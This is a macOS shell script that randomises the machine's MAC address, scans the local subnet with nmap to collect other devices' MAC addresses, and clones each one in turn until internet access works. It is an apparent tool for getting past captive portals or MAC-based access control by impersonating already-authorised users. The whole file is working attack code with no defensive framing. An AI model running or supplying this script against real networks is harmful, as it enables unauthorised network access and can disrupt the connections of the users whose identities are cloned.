#!/bin/sh

# pre-requisites
# npm install spoof -g
# nmap

HOSTNAME='unicorn'
SUBNET='172.19.0.0/23'
INTERFACE='en0'
CHECK_INTERNET_IP=8.8.8.8
NUMBER_OF_CHECKS='3'


echo "changing hostname... "
# make sure to change the hostname
sudo scutil --set HostName $HOSTNAME
echo "done"

echo "randomizing mac... "
sudo spoof randomize ${INTERFACE}
sudo spoof list | grep ${INTERFACE}

echo "waiting for ip... "
ip=`ifconfig $INTERFACE | grep 'inet ' | awk '{print $2}'`
while [ "x$ip" = "x" ]; do
  sleep 1
  ip=`ifconfig $INTERFACE | grep 'inet ' | awk '{print $2}'`
done
echo "got ip '${ip}'"
packets_received=`ping -q -c ${NUMBER_OF_CHECKS} ${CHECK_INTERNET_IP} | grep 'packets received' | awk '{print $4}'`
if [ "${packets_received}" = "${NUMBER_OF_CHECKS}" ]; then
  echo "connected to internet:) using mac [$mac]"
  exit 0;
fi

echo "getting mac list... "
# get the mac list
macs=`sudo nmap -v -PS -sn $SUBNET | grep -i 'mac address' | awk '{print $3}'`
echo "done"
echo "mac list:\n$macs"

echo "spoofing... "
for mac in $macs; do
  echo "checking mac $mac..."
  sudo spoof set $mac $INTERFACE
  ip=`ifconfig $INTERFACE | grep 'inet ' | awk '{print $2}'`
  while [ "x$ip" = "x" ]; do
    sleep 1
    ip=`ifconfig $INTERFACE | grep 'inet ' | awk '{print $2}'`
  done
  echo "got ip '${ip}''"
  packets_received=`ping -q -c ${NUMBER_OF_CHECKS} ${CHECK_INTERNET_IP} | grep 'packets received' | awk '{print $4}'`
  if [ "${packets_received}" = "${NUMBER_OF_CHECKS}" ]; then
    echo "connected to internet:) using mac [$mac]"
    exit 0;
  fi
done
echo "checked all the macs, none of them is connected to internet :("
